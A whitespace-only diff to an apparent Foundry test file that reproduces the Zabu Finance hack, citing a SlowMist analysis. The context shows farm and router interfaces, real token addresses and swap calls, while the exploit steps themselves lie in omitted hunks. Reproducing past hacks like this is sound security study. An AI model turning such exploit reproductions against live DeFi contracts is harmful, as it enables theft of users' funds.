@@ -7,12 +7,15 @@ import "./../interface.sol";
 // https://slowmist.medium.com/brief-analysis-of-zabu-finance-being-hacked-44243919ea29
 
 interface ZABUFarm {
+
     function deposit(uint256 _pid, uint256 _amount) external;
     function withdraw(uint256 _pid, uint256 _amount) external;
     function emergencyWithdraw(uint256 _pid) external;
+
 }
 
 interface PangolinRouter {
+
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -20,9 +23,11 @@ interface PangolinRouter {
         address to,
         uint256 deadline
     ) external;
+
 }
 
 contract depositToken {
+
     IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);
     IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
     IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);
@@ -56,9 +61,11 @@ contract depositToken {
             ZABU.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
+
 }
 
 contract ContractTest is Test {
+
     IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);
     IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
     IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);
@@ -162,4 +169,5 @@ contract ContractTest is Test {
         path[1] = address(PNG);
         Router.swapTokensForExactTokens(amount, WAVAX.balanceOf(address(this)), path, address(this), block.timestamp);
     }
+
 }
